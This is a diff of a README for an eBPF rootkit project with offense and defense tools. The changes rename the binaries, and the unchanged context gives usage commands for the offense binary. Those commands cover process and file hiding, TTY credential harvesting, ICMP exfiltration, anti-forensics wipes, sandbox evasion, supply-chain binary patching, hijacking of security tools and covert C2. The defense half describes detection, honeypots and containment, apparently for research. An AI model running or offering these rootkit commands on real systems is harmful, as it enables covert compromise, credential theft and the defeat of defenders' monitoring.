@@ -64,10 +64,10 @@ cargo build
 
 ```bash
 # Start the rootkit with default settings (loads core 13 features)
-sudo ./target/release/offense --iface eth0
+sudo ./target/release/aegis-shadow-offense --iface eth0
 
 # Enable all extended features
-sudo ./target/release/offense --iface eth0 \
+sudo ./target/release/aegis-shadow-offense --iface eth0 \
     --enable-netns-hide \
     --enable-bpf-cloak \
     --enable-module-mask \
@@ -125,10 +125,10 @@ sudo ./target/release/offense --iface eth0 \
 #### 1. Process Hiding
 ```bash
 # Hide a specific process
-sudo ./target/release/offense --iface eth0 --hide-pid 1234
+sudo ./target/release/aegis-shadow-offense --iface eth0 --hide-pid 1234
 
 # Hide current shell
-sudo ./target/release/offense --iface eth0 --hide-pid $$
+sudo ./target/release/aegis-shadow-offense --iface eth0 --hide-pid $$
 ```
 
 #### 2. File Obfuscation
@@ -137,33 +137,33 @@ sudo ./target/release/offense --iface eth0 --hide-pid $$
 INODE=$(stat -c %i /path/to/secret.txt)
 
 # Obfuscate the file
-sudo ./target/release/offense --iface eth0 --obfuscate-inode $INODE
+sudo ./target/release/aegis-shadow-offense --iface eth0 --obfuscate-inode $INODE
 ```
 
 #### 3. Credential Harvesting
 ```bash
 # Monitor TTY device (e.g., pts/0 = 136:0)
-sudo ./target/release/offense --iface eth0 --monitor-tty 136:0
+sudo ./target/release/aegis-shadow-offense --iface eth0 --monitor-tty 136:0
 ```
 
 #### 4. Process Ancestry Spoofing
 ```bash
 # Spoof PID 1234's parent to appear as PID 1 (init)
-sudo ./target/release/offense --iface eth0 --spoof-ppid 1234:1
+sudo ./target/release/aegis-shadow-offense --iface eth0 --spoof-ppid 1234:1
 ```
 
 #### 5. Timestomping
 ```bash
 # Fake timestamps (format: inode:atime:mtime:ctime in epoch seconds)
 INODE=$(stat -c %i /path/to/file.txt)
-sudo ./target/release/offense --iface eth0 \
+sudo ./target/release/aegis-shadow-offense --iface eth0 \
     --timestomp $INODE:1609459200:1609459200:1609459200
 ```
 
 #### 6. Map Persistence
 ```bash
 # Pin BPF maps to filesystem for persistence across loader restarts
-sudo ./target/release/offense --iface eth0 --pin-maps
+sudo ./target/release/aegis-shadow-offense --iface eth0 --pin-maps
 
 # Maps will be available at /sys/fs/bpf/shadow
 ```
@@ -171,11 +171,11 @@ sudo ./target/release/offense --iface eth0 --pin-maps
 #### 7. ICMP Covert Channel
 ```bash
 # Enable ICMP-based data exfiltration
-sudo ./target/release/offense --iface eth0 --enable-icmp-exfil
+sudo ./target/release/aegis-shadow-offense --iface eth0 --enable-icmp-exfil
 
 # Data is embedded in ICMP echo-request payloads (56 bytes per packet)
 # Combined with credential relay for automated exfil:
-sudo ./target/release/offense --iface eth0 \
+sudo ./target/release/aegis-shadow-offense --iface eth0 \
     --enable-icmp-exfil \
     --enable-cred-relay \
     --monitor-tty 136:0
@@ -184,41 +184,41 @@ sudo ./target/release/offense --iface eth0 \
 #### 8. Network Namespace Hiding
 ```bash
 # Hide network namespaces from tools like ip netns
-sudo ./target/release/offense --iface eth0 --enable-netns-hide
+sudo ./target/release/aegis-shadow-offense --iface eth0 --enable-netns-hide
 ```
 
 #### 9. eBPF Program Cloaking
 ```bash
 # Hide rootkit's own BPF program IDs from bpftool
-sudo ./target/release/offense --iface eth0 --enable-bpf-cloak
+sudo ./target/release/aegis-shadow-offense --iface eth0 --enable-bpf-cloak
 ```
 
 #### 10. Anti-Forensics Bytecode Wipe
 ```bash
 # After initial operation, wipe program logic for anti-forensics
 # Programs remain attached but become no-ops (evades bytecode dump analysis)
-sudo ./target/release/offense --iface eth0 --wipe-bytecode
+sudo ./target/release/aegis-shadow-offense --iface eth0 --wipe-bytecode
 ```
 
 #### 11. Container Escape Probes
 ```bash
 # Detect container context and monitor privilege escalation attempts
-sudo ./target/release/offense --iface eth0 --enable-container-probe
+sudo ./target/release/aegis-shadow-offense --iface eth0 --enable-container-probe
 ```
 
 #### 12. Memory-Only Execution
 ```bash
 # Enable fileless execution path (memfd_create + execveat AT_EMPTY_PATH)
-sudo ./target/release/offense --iface eth0 --enable-memfd
+sudo ./target/release/aegis-shadow-offense --iface eth0 --enable-memfd
 ```
 
 #### 13. Hypervisor Evasion
 ```bash
 # Detect hypervisor type and exploit blind spots
-sudo ./target/release/offense --iface eth0 --enable-hypervisor-evasion
+sudo ./target/release/aegis-shadow-offense --iface eth0 --enable-hypervisor-evasion
 
 # Combined with polymorphic to evade VM-based analysis sandboxes
-sudo ./target/release/offense --iface eth0 \
+sudo ./target/release/aegis-shadow-offense --iface eth0 \
     --enable-hypervisor-evasion \
     --enable-polymorphic
 ```
@@ -226,7 +226,7 @@ sudo ./target/release/offense --iface eth0 \
 #### 14. Polymorphic Engine
 ```bash
 # Enable self-modifying bytecode with pattern rotation
-sudo ./target/release/offense --iface eth0 --enable-polymorphic
+sudo ./target/release/aegis-shadow-offense --iface eth0 --enable-polymorphic
 
 # Rotates instruction patterns via tail-call variant selection
 # Inserts opaque predicates to defeat static analysis tools
@@ -235,7 +235,7 @@ sudo ./target/release/offense --iface eth0 --enable-polymorphic
 #### 15. Phantom Network Stack
 ```bash
 # Create invisible TCP connections below kernel stack
-sudo ./target/release/offense --iface eth0 --enable-phantom-stack
+sudo ./target/release/aegis-shadow-offense --iface eth0 --enable-phantom-stack
 
 # Phantom connections are invisible to ss, netstat, and conntrack
 # Full stateful TCP handling (SYN/ACK, data transfer, FIN)
@@ -244,7 +244,7 @@ sudo ./target/release/offense --iface eth0 --enable-phantom-stack
 #### 16. Cross-Container Lateral Movement
 ```bash
 # Enable cross-container movement via cgroup/namespace abuse
-sudo ./target/release/offense --iface eth0 --enable-container-lateral
+sudo ./target/release/aegis-shadow-offense --iface eth0 --enable-container-lateral
 
 # Injects eBPF programs into target container cgroups
 # Traverses namespaces and detects credential changes for escape
@@ -253,7 +253,7 @@ sudo ./target/release/offense --iface eth0 --enable-container-lateral
 #### 17. DMA Covert Channels
 ```bash
 # Enable hardware-level covert channels
-sudo ./target/release/offense --iface eth0 --enable-dma-covert
+sudo ./target/release/aegis-shadow-offense --iface eth0 --enable-dma-covert
 
 # Uses IOMMU page tables, PCIe TLP patterns, and NIC padding
 # for data exfiltration below OS visibility
@@ -262,7 +262,7 @@ sudo ./target/release/offense --iface eth0 --enable-dma-covert
 #### 18. Behavioral AI Camouflage
 ```bash
 # Enable statistical camouflage to evade anomaly detectors
-sudo ./target/release/offense --iface eth0 --enable-behavioral-ai
+sudo ./target/release/aegis-shadow-offense --iface eth0 --enable-behavioral-ai
 
 # Profiles system behavior baseline, throttles rootkit activity
 # to stay within normal statistical norms
@@ -271,7 +271,7 @@ sudo ./target/release/offense --iface eth0 --enable-behavioral-ai
 #### 19. Supply Chain Persistence
 ```bash
 # Hook package managers and patch binaries during install
-sudo ./target/release/offense --iface eth0 --enable-supply-chain
+sudo ./target/release/aegis-shadow-offense --iface eth0 --enable-supply-chain
 
 # Monitors apt/yum/pip/npm/cargo executions
 # Patches binaries in-flight and bypasses integrity checks
@@ -280,7 +280,7 @@ sudo ./target/release/offense --iface eth0 --enable-supply-chain
 #### 20. Dead Man's Switch
 ```bash
 # Arm the dead man's switch with heartbeat monitoring
-sudo ./target/release/offense --iface eth0 --enable-deadman-switch
+sudo ./target/release/aegis-shadow-offense --iface eth0 --enable-deadman-switch
 
 # If heartbeat UDP packets stop arriving, triggers scorched earth
 # wipe of all evidence (maps, logs, artifacts)
@@ -289,7 +289,7 @@ sudo ./target/release/offense --iface eth0 --enable-deadman-switch
 #### 21. BPF Parasitism
 ```bash
 # Detect and parasitize other eBPF security tools
-sudo ./target/release/offense --iface eth0 --enable-bpf-parasitism
+sudo ./target/release/aegis-shadow-offense --iface eth0 --enable-bpf-parasitism
 
 # Scans for Falco/Tetragon/Cilium/Datadog programs
 # Injects into their tail-call arrays and hijacks prog arrays
@@ -298,7 +298,7 @@ sudo ./target/release/offense --iface eth0 --enable-bpf-parasitism
 #### 22. Advanced Kernel Object Manipulation
 ```bash
 # task_struct patching, LSM subversion, IDT hooking, ftrace hiding, live-patching
-sudo ./target/release/offense --iface eth0 --enable-kernel-object
+sudo ./target/release/aegis-shadow-offense --iface eth0 --enable-kernel-object
 
 # Patches task_struct fields, overrides LSM decisions, shadows IDT entries,
 # hides from bpftool enumeration, abuses kernel live-patching infrastructure
@@ -307,7 +307,7 @@ sudo ./target/release/offense --iface eth0 --enable-kernel-object
 #### 23. Network Stealth Layer
 ```bash
 # Raw socket C2, TC injection, DoH domain fronting, traffic shaping
-sudo ./target/release/offense --iface eth0 --enable-network-stealth
+sudo ./target/release/aegis-shadow-offense --iface eth0 --enable-network-stealth
 
 # XDP-based port coexistence C2, TC egress packet injection without sockets,
 # DNS-over-HTTPS C2 with CDN domain fronting, kernel-level traffic shaping
@@ -316,7 +316,7 @@ sudo ./target/release/offense --iface eth0 --enable-network-stealth
 #### 24. Advanced Persistence Mechanisms
 ```bash
 # Obfuscated BPF pinning, cgroup persistence, module param injection, initramfs
-sudo ./target/release/offense --iface eth0 --enable-persistence2
+sudo ./target/release/aegis-shadow-offense --iface eth0 --enable-persistence2
 
 # Randomized BPF pin paths, cgroup attachment surviving process death,
 # hidden params in /sys/module, boot-time BPF loader via initramfs
@@ -325,7 +325,7 @@ sudo ./target/release/offense --iface eth0 --enable-persistence2
 #### Full Advanced Deployment
 ```bash
 # Enable all advanced modules for maximum evasion
-sudo ./target/release/offense --iface eth0 \
+sudo ./target/release/aegis-shadow-offense --iface eth0 \
     --hide-pid $$ \
     --enable-bpf-cloak \
     --enable-hypervisor-evasion \
@@ -398,13 +398,13 @@ sudo pkill -9 offense
 
 ```bash
 # Run all detection modules
-sudo ./target/release/defense --all-modules
+sudo ./target/release/aegis-shadow-defense --all-modules
 
 # Run with verbose logging
-sudo ./target/release/defense --all-modules --verbose
+sudo ./target/release/aegis-shadow-defense --all-modules --verbose
 
 # Save alerts to JSON file
-sudo ./target/release/defense --all-modules --output /tmp/alerts.json
+sudo ./target/release/aegis-shadow-defense --all-modules --output /tmp/alerts.json
 ```
 
 ### CLI Flags
@@ -441,7 +441,7 @@ sudo ./target/release/defense --all-modules --output /tmp/alerts.json
 
 ```bash
 # Original 5 core modules
-sudo ./target/release/defense \
+sudo ./target/release/aegis-shadow-defense \
     --ghost-maps \
     --syscall-latency \
     --bytecode-check \
@@ -449,7 +449,7 @@ sudo ./target/release/defense \
     --suspicious-hooks
 
 # Extended detection modules
-sudo ./target/release/defense \
+sudo ./target/release/aegis-shadow-defense \
     --prog-inventory \
     --syscall-anomaly \
     --net-baseline \
@@ -458,7 +458,7 @@ sudo ./target/release/defense \
     --tracepoint-monitor
 
 # Anti-detection research modules (12-15)
-sudo ./target/release/defense \
+sudo ./target/release/aegis-shadow-defense \
     --cross-reference \
     --hw-perf-counters \
     --verifier-analysis \
@@ -466,17 +466,17 @@ sudo ./target/release/defense \
     --enable-ml
 
 # Active response modules
-sudo ./target/release/defense \
+sudo ./target/release/aegis-shadow-defense \
     --all-modules \
     --auto-detach \
     --auto-contain \
     --honeypots
 
 # Set alert threshold (1=Low, 2=Medium, 3=High, 4=Critical)
-sudo ./target/release/defense --all-modules --threshold 3
+sudo ./target/release/aegis-shadow-defense --all-modules --threshold 3
 
 # Custom calibration period
-sudo ./target/release/defense --all-modules --calibration-period 120
+sudo ./target/release/aegis-shadow-defense --all-modules --calibration-period 120
 ```
 
 ### Honeypot Maps
@@ -485,7 +485,7 @@ The honeypot module creates decoy BPF maps with enticing names and pins them to 
 
 ```bash
 # Enable honeypot maps
-sudo ./target/release/defense --honeypots --verbose
+sudo ./target/release/aegis-shadow-defense --honeypots --verbose
 
 # Decoy maps created:
 #   /sys/fs/bpf/honeypot/shadow_config
@@ -498,7 +498,7 @@ sudo ./target/release/defense --honeypots --verbose
 When enabled, the defense engine automatically detaches BPF programs that accumulate 3+ corroborating alerts (from prog_inventory, suspicious_hooks, or map_audit modules).
 
 ```bash
-sudo ./target/release/defense --all-modules --auto-detach
+sudo ./target/release/aegis-shadow-defense --all-modules --auto-detach
 ```
 
 ### Auto-Contain
@@ -506,7 +506,7 @@ sudo ./target/release/defense --all-modules --auto-detach
 When an attack chain is detected (3+ distinct alert types for a single PID within the sliding window), the engine moves the offending process into a restrictive cgroup.
 
 ```bash
-sudo ./target/release/defense --all-modules --auto-contain
+sudo ./target/release/aegis-shadow-defense --all-modules --auto-contain
 ```
 
 ### Runtime Configuration (Hot-Reload)
@@ -523,7 +523,7 @@ The defense engine can reload its configuration without restarting. Create a JSO
 Start the engine with `--config`:
 
 ```bash
-sudo ./target/release/defense --all-modules --config /etc/aegis/config.json
+sudo ./target/release/aegis-shadow-defense --all-modules --config /etc/aegis/config.json
 ```
 
 The engine polls the file every 5 seconds. To change detection sensitivity at runtime:
@@ -550,7 +550,7 @@ The engine provides more than raw alert forwarding:
 
 ```bash
 # View real-time alerts
-sudo ./target/release/defense --all-modules --verbose
+sudo ./target/release/aegis-shadow-defense --all-modules --verbose
 
 # Parse JSON output
 jq '.alert_type' /tmp/alerts.json | sort | uniq -c
@@ -594,7 +594,7 @@ make test
 #### Test Process Hiding
 ```bash
 # Terminal 1: Start rootkit
-sudo ./target/release/offense --iface eth0 --hide-pid $$
+sudo ./target/release/aegis-shadow-offense --iface eth0 --hide-pid $$
 
 # Terminal 2: Verify hiding
 ps aux | grep $$  # Should not appear
@@ -608,7 +608,7 @@ echo "secret data" > /tmp/test.txt
 INODE=$(stat -c %i /tmp/test.txt)
 
 # Start rootkit with obfuscation
-sudo ./target/release/offense --iface eth0 --obfuscate-inode $INODE
+sudo ./target/release/aegis-shadow-offense --iface eth0 --obfuscate-inode $INODE
 
 # Try to read file
 cat /tmp/test.txt  # Should show zeros
@@ -617,10 +617,10 @@ cat /tmp/test.txt  # Should show zeros
 #### Test Defense Detection
 ```bash
 # Terminal 1: Start defense with all modules
-sudo ./target/release/defense --all-modules --verbose --honeypots
+sudo ./target/release/aegis-shadow-defense --all-modules --verbose --honeypots
 
 # Terminal 2: Start offense (should trigger alerts)
-sudo ./target/release/offense --iface eth0 \
+sudo ./target/release/aegis-shadow-offense --iface eth0 \
     --hide-pid 1234 \
     --enable-bpf-cloak \
     --enable-memfd
@@ -631,7 +631,7 @@ sudo ./target/release/offense --iface eth0 \
 #### Test Honeypot Detection
 ```bash
 # Terminal 1: Start defense with honeypots
-sudo ./target/release/defense --honeypots --verbose
+sudo ./target/release/aegis-shadow-defense --honeypots --verbose
 
 # Terminal 2: Attempt to read honeypot map
 sudo bpftool map dump pinned /sys/fs/bpf/honeypot/shadow_config
@@ -642,7 +642,7 @@ sudo bpftool map dump pinned /sys/fs/bpf/honeypot/shadow_config
 #### Test Auto-Contain
 ```bash
 # Start defense with auto-containment
-sudo ./target/release/defense --all-modules --auto-contain --verbose
+sudo ./target/release/aegis-shadow-defense --all-modules --auto-contain --verbose
 
 # In another terminal, trigger attack chain (3+ alert types from one PID)
 # The defense engine will move the PID to a restrictive cgroup
@@ -715,13 +715,13 @@ sudo dmesg | grep -i bpf
 ### Reduce Overhead
 ```bash
 # Disable verbose logging
-./target/release/offense --iface eth0  # No --verbose flag
+./target/release/aegis-shadow-offense --iface eth0  # No --verbose flag
 
 # Use higher threshold to reduce alert volume
-./target/release/defense --all-modules --threshold 3
+./target/release/aegis-shadow-defense --all-modules --threshold 3
 
 # Shorter calibration for faster startup
-./target/release/defense --all-modules --calibration-period 30
+./target/release/aegis-shadow-defense --all-modules --calibration-period 30
 ```
 
 ### Optimize for Production
